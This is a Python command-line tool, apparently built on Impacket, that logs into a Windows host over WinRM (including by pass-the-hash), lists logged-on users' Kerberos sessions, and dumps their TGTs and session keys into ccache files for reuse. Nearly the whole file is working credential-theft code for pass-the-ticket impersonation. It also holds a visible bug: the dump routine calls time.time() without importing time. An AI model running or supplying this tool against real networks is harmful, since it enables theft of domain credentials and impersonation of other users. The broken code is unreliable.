#!/usr/bin/env python3
"""
klistwinrm – Remote Kerberos session listing and TGT dump via WinRM

Connects to a Windows host via WinRM (HTTP/HTTPS), runs klist sessions
and klist tgt -li <id>, parses TGTs and writes MIT ccache files.

Supports NTLM (password or pass-the-hash), Kerberos, and AES key auth.
Pass-the-hash requires `requests-ntlm2` (pip install requests-ntlm2).

Usage:
  klistwinrm list  [[domain/]username[:password]@]target [options]
  klistwinrm dump  [[domain/]username[:password]@]target [-s N] [-o dir] [options]
"""

from __future__ import print_function

import argparse
import logging
import os
import re
import struct
import sys
from datetime import datetime, timezone
from getpass import getpass

import winrm

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target


# ─── klist text parser ────────────────────────────────────────────────────────

def _parse_klist(text):
    """Parse output of `klist tgt [-li 0x...]` into a credential dict."""

    def field(pat, default=""):
        m = re.search(pat, text, re.IGNORECASE)
        return m.group(1).strip() if m else default

    def parse_time(s):
        if not s:
            return 0
        for fmt in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
            try:
                return int(
                    datetime.strptime(s.strip(), fmt)
                    .replace(tzinfo=timezone.utc)
                    .timestamp()
                )
            except ValueError:
                pass
        return 0

    ticket_hex = []
    for m in re.finditer(
        r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE
    ):
        ticket_hex.append(re.sub(r"[^0-9a-fA-F]", "", m.group(1)))
    ticket_bytes = bytes.fromhex("".join(ticket_hex)) if ticket_hex else b""

    _KEY_SIZES = {0x01: 8, 0x03: 8, 0x11: 16, 0x12: 32, 0x17: 16, 0x18: 16}

    key_type = int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", "0x12"), 16)

    raw = re.sub(
        r"\s+",
        "",
        field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"),
    )
    try:
        raw_bytes = bytes.fromhex(raw) if raw else b""
    except ValueError:
        raw_bytes = b""

    # Credential Guard variant: the blob is a marshalled KerberosKeyWithMetadata
    # — self-size@0, typename-length@8, typename-offset@12 pointing at the literal
    # ASCII "KerberosKeyWithMetadata", key@28, then the typename + metadata tail.
    # Here offset 8 is NOT the etype, so fall back to the "KeyType 0x.." header.
    cred_guard = False
    key_bytes = b""
    if raw_bytes:
        if len(raw_bytes) >= 16 and struct.unpack_from("<I", raw_bytes, 0)[0] == len(raw_bytes):
            _TN = b"KerberosKeyWithMetadata"
            tn_len = struct.unpack_from("<I", raw_bytes, 8)[0]
            tn_off = struct.unpack_from("<I", raw_bytes, 12)[0]
            cred_guard = (
                tn_len == len(_TN)
                and 0 < tn_off <= len(raw_bytes) - len(_TN)
                and raw_bytes[tn_off:tn_off + len(_TN)] == _TN
            )
            # Non-CG SYSTEM blob: etype@8, cleartext key@28 — extract it.
            # CG blob: key material is wrapped/encrypted (protected in VTL1) and is
            # NOT recoverable offline, so do not treat offset-28 bytes as a key.
            if not cred_guard:
                etype_in_blob = struct.unpack_from("<I", raw_bytes, 8)[0]
                key_sz = _KEY_SIZES.get(etype_in_blob)
                if key_sz and len(raw_bytes) >= 28 + key_sz:
                    key_type = etype_in_blob
                    key_bytes = raw_bytes[28:28 + key_sz]
                    logging.debug("  Extracted %d-byte key (etype 0x%x) from metadata blob" % (key_sz, etype_in_blob))
        if not key_bytes:
            expected = _KEY_SIZES.get(key_type, 32)
            if len(raw_bytes) == expected:
                key_bytes = raw_bytes

    if not key_bytes:
        expected = _KEY_SIZES.get(key_type, 32)
        key_bytes = b"\x00" * expected
        logging.debug("  Session key unavailable; using %d zero bytes for etype 0x%x" % (expected, key_type))

    return {
        "client": field(r"ClientName\s*:\s*(.+)"),
        "realm": field(r"DomainName\s*:\s*(.+)"),
        "sname": [
            field(r"ServiceName\s*:\s*(.+)"),
            field(r"TargetDomainName\s*:\s*(.+)"),
        ],
        "flags": int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
        "key_type": key_type,
        "key_data": key_bytes,
        "cred_guard": cred_guard,
        "auth_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "start_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "end_time": parse_time(field(r"EndTime\s*:\s*(.+?)\s*\(local\)")),
        "renew_till": parse_time(field(r"RenewUntil\s*:\s*(.+?)\s*\(local\)")),
        "ticket_data": ticket_bytes,
    }


# ─── ccache writer (MIT credential cache v4) ─────────────────────────────────

def _write_ccache(info, path):
    def p16(n):
        return struct.pack(">H", n)

    def p32(n):
        return struct.pack(">I", n)

    def cnt(b):
        return p32(len(b)) + b

    def principal(name, realm, ntype=1):
        parts = name.split("/") if "/" in name else [name]
        out = p32(ntype) + p32(len(parts)) + cnt(realm.encode())
        for component in parts:
            out += cnt(component.encode())
        return out

    hdr = b"\x05\x04"
    tag = p16(1) + p16(8) + struct.pack(">I", 0xFFFFFFFF) + p32(0)
    hdr += p16(len(tag)) + tag

    default_p = principal(info["client"], info["realm"])
    cred = principal(info["client"], info["realm"])
    cred += principal("/".join(info["sname"]), info["realm"], 1)
    cred += p16(info["key_type"])
    cred += p16(0)
    cred += p16(len(info["key_data"])) + info["key_data"]
    cred += struct.pack(
        ">IIII",
        info["auth_time"],
        info["start_time"],
        info["end_time"],
        info["renew_till"],
    )
    cred += b"\x00"
    cred += p32(info["flags"])
    cred += p32(0)
    cred += p32(0)
    cred += cnt(info["ticket_data"])
    cred += cnt(b"")

    with open(path, "wb") as f:
        f.write(hdr + default_p + cred)
    return path


# ─── Session list parser ──────────────────────────────────────────────────────

SESSION_LINE = re.compile(
    r"\[\d+\]\s+Session\s+\d+\s+0:(0x[0-9a-fA-F]+)\s+(.+?)\s+Kerberos:\S+\s*$"
)


def parse_klist_sessions(text, include_computer=False):
    """Extract (logon_id_hex, account) for Kerberos sessions.

    Kerberos:Network sessions (machine/computer accounts) are excluded by
    default; pass include_computer=True to include them.
    """
    sessions = []
    for line in text.splitlines():
        line = line.strip()
        if "Kerberos" not in line:
            continue
        if "Kerberos:Network" in line and not include_computer:
            continue
        m = SESSION_LINE.search(line)
        if m:
            logon_hex = m.group(1).strip()
            account = m.group(2).strip()
            if logon_hex and account:
                sessions.append((logon_hex, account))
    return sessions


# ─── WinRM connection ─────────────────────────────────────────────────────────

def _connect(args, domain, username, password, address, lmhash, nthash):
    port = args.port
    use_ssl = args.ssl
    if port is None:
        port = 5986 if use_ssl else 5985

    scheme = "https" if use_ssl else "http"
    endpoint = "%s://%s:%d/wsman" % (scheme, address, port)

    if args.k:
        transport = "kerberos"
        user = "%s\\%s" % (domain, username) if domain else username
        passwd = password or ""
    elif nthash:
        # Pass-the-hash: requires requests-ntlm2 (pip install requests-ntlm2)
        transport = "ntlm"
        user = "%s\\%s" % (domain, username) if domain else username
        passwd = "%s:%s" % (lmhash if lmhash else "00000000000000000000000000000000", nthash)
    else:
        transport = "ntlm"
        user = "%s\\%s" % (domain, username) if domain else username
        passwd = password

    logging.info("Connecting to %s (%s transport) ..." % (endpoint, transport))
    try:
        session = winrm.Session(
            endpoint,
            auth=(user, passwd),
            transport=transport,
            server_cert_validation="ignore",
        )
        # Probe connection with a trivial command
        r = session.run_cmd("echo", ["ok"])
        if r.status_code != 0:
            raise RuntimeError("probe failed (exit %d): %s" % (
                r.status_code,
                r.std_err.decode("utf-8", errors="replace").strip(),
            ))
    except Exception as e:
        logging.error("WinRM connect failed: %s" % e)
        sys.exit(1)

    return session


def _run_cmd(session, cmd):
    """Run a shell command via WinRM; return stdout string or None on error."""
    r = session.run_cmd(cmd)
    stderr = r.std_err.decode("utf-8", errors="replace").strip()
    if stderr:
        logging.debug("  stderr: %s" % stderr)
    if r.status_code != 0 and not r.std_out:
        logging.error("Command failed (exit %d): %s" % (r.status_code, stderr))
        return None
    return r.std_out.decode("utf-8", errors="replace")


# ─── Shared auth argument builder ────────────────────────────────────────────

def _add_auth_args(parser):
    parser.add_argument("-ts", action="store_true", help="Add timestamp to every logging output")
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument(
        "--computer",
        action="store_true",
        help="Include computer/machine account sessions (Kerberos:Network sessions, e.g. HOSTNAME$)",
    )

    conn = parser.add_argument_group("connection")
    conn.add_argument(
        "-port",
        type=int,
        default=None,
        metavar="PORT",
        help="WinRM port (default: 5985 for HTTP, 5986 for HTTPS)",
    )
    conn.add_argument(
        "-ssl",
        action="store_true",
        help="Use HTTPS (WinRM over SSL, default port 5986)",
    )

    group = parser.add_argument_group("authentication")
    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes for pass-the-hash (requires requests-ntlm2)",
    )
    group.add_argument(
        "-no-pass",
        action="store_true",
        help="Don't ask for password (useful for -k)",
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
             "(KRB5CCNAME) based on target parameters.",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key for Kerberos auth (128 or 256 bits). "
             "Use impacket's getTGT.py to obtain a ccache first, then set KRB5CCNAME and use -k.",
    )
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP address of the domain controller (used with -k)",
    )
    group.add_argument(
        "-keytab",
        action="store",
        help="Read keys for SPN from keytab file",
    )


# ─── Main flow ────────────────────────────────────────────────────────────────

def _resolve_creds(args):
    domain, username, password, address = parse_target(args.target)
    if domain is None:
        domain = ""

    if args.keytab is not None:
        from impacket.krb5.keytab import Keytab
        Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
        args.k = True

    if args.aesKey is not None:
        args.k = True

    if (
        password == ""
        and username != ""
        and args.hashes is None
        and not args.no_pass
        and args.aesKey is None
        and not args.k
    ):
        password = getpass("Password: ")

    lmhash = ""
    nthash = ""
    if args.hashes:
        lmhash, nthash = args.hashes.split(":")

    return domain, username, password, address, lmhash, nthash


def cmd_list(args):
    domain, username, password, address, lmhash, nthash = _resolve_creds(args)
    session = _connect(args, domain, username, password, address, lmhash, nthash)

    logging.info("Enumerating remote Kerberos sessions ...")
    sessions_text = _run_cmd(session, "klist sessions")
    if sessions_text is None:
        sys.exit(1)

    if args.debug:
        print(sessions_text)

    sessions = parse_klist_sessions(sessions_text, include_computer=args.computer)
    if not sessions:
        logging.warning("No Kerberos sessions found")
        sys.exit(0)

    print()
    print("  Kerberos sessions on %s:\n" % address)
    w = max(len(a) for _, a in sessions)
    for i, (logon_hex, account) in enumerate(sessions, 1):
        print("  [%d]  %-*s  %s" % (i, w, account, logon_hex))
    print()


def cmd_dump(args):
    domain, username, password, address, lmhash, nthash = _resolve_creds(args)
    session = _connect(args, domain, username, password, address, lmhash, nthash)
    os.makedirs(args.output_dir, exist_ok=True)

    logging.info("Enumerating remote Kerberos sessions ...")
    sessions_text = _run_cmd(session, "klist sessions")
    if sessions_text is None:
        sys.exit(1)

    if args.debug:
        print(sessions_text)

    sessions = parse_klist_sessions(sessions_text, include_computer=args.computer)
    if not sessions:
        logging.warning("No Kerberos sessions found")
        sys.exit(0)

    # Apply -s N filter
    if args.session is not None:
        idx = args.session
        if idx < 1 or idx > len(sessions):
            logging.error(
                "Session %d out of range (1-%d). Use 'list' to see available sessions." % (idx, len(sessions))
            )
            sys.exit(1)
        to_dump = [sessions[idx - 1]]
    else:
        to_dump = sessions

    w = max(len(a) for _, a in to_dump)
    print()
    print("  Sessions to dump:\n")
    for i, (logon_hex, account) in enumerate(to_dump, 1):
        print("  [%d]  %-*s  %s" % (i, w, account, logon_hex))
    print()

    written = []
    for i, (logon_hex, account) in enumerate(to_dump, 1):
        print()
        logging.info("[%d/%d] Dumping TGT for %s (%s) ..." % (i, len(to_dump), account, logon_hex))
        tgt_text = _run_cmd(session, "klist tgt -li %s" % logon_hex)
        if not tgt_text:
            logging.error("  No output for %s" % account)
            continue

        if args.debug:
            print(tgt_text)

        info = _parse_klist(tgt_text)
        if not info["ticket_data"]:
            logging.error("  No ticket data found for %s" % account)
            continue

        if info.get("cred_guard"):
            logging.error("  %s: session key is Credential Guard-protected (wrapped in VTL1); "
                          "cannot export a usable ccache. Skipping." % account)
            continue
          
        now = time.time()

        if info["end_time"]:
            etime = datetime.fromtimestamp(info["end_time"]).isoformat()
            logging.info("  EndTime: %s", etime)

        if info["renew_till"]:
            rtime = datetime.fromtimestamp(info["renew_till"]).isoformat()
            logging.info("  Renew Until: %s", rtime)
            if info["renew_till"] < now:          
                logging.info("  Expired Ticket!")
                continue
              
        safe_name = re.sub(r"[^\w@.-]", "_", "%s@%s" % (info["client"], info["realm"]))
        out_path = os.path.join(args.output_dir, safe_name + ".ccache")
        if os.path.exists(out_path):
            idx2 = 1
            while os.path.exists(out_path):
                out_path = os.path.join(args.output_dir, "%s_%d.ccache" % (safe_name, idx2))
                idx2 += 1

        _write_ccache(info, out_path)
        written.append(out_path)
        logging.info("  -> %s" % out_path)

    if written:
        logging.info("Done. %d ccache(s) written to %s" % (len(written), args.output_dir))
    else:
        logging.error("No ccache files written")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Remote Kerberos session listing and TGT dump via WinRM",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    subparsers = parser.add_subparsers(dest="mode", metavar="mode")
    subparsers.required = True

    # ── list subcommand ──────────────────────────────────────────────────────
    list_parser = subparsers.add_parser(
        "list",
        help="List active Kerberos sessions on the target",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    list_parser.add_argument("target", help="[[domain/]username[:password]@]target")
    _add_auth_args(list_parser)

    # ── dump subcommand ──────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser(
        "dump",
        help="Dump TGTs for Kerberos sessions (all, or a specific session number)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    dump_parser.add_argument("target", help="[[domain/]username[:password]@]target")
    dump_parser.add_argument(
        "-s", "--session",
        type=int,
        default=None,
        metavar="N",
        help="Session number to dump (1-based, from 'list'). Omit to dump all.",
    )
    dump_parser.add_argument(
        "-o", "--output-dir",
        default=".",
        help="Directory to write .ccache files (default: current directory)",
    )
    _add_auth_args(dump_parser)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    print(version.BANNER)
    logger.init(args.ts)
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.mode == "list":
        cmd_list(args)
    elif args.mode == "dump":
        cmd_dump(args)


if __name__ == "__main__":
    main()
